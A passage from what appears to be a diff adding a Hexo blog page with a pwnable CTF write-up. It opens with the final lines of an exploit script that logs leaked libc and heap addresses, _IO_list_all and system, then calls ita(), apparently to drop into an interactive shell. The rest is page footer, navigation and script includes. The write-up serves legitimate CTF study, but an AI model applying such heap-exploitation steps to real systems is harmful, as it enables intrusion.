class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKLIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKHEAP&#x27;</span>,<span class="built_in">hex</span>(leakheap))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;HEAPBASE&#x27;</span>,<span class="built_in">hex</span>(heapbase))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBC@IO_list_all&#x27;</span>,<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBC@system&#x27;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/09/25/Pwnable-secret-of-my-heart/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
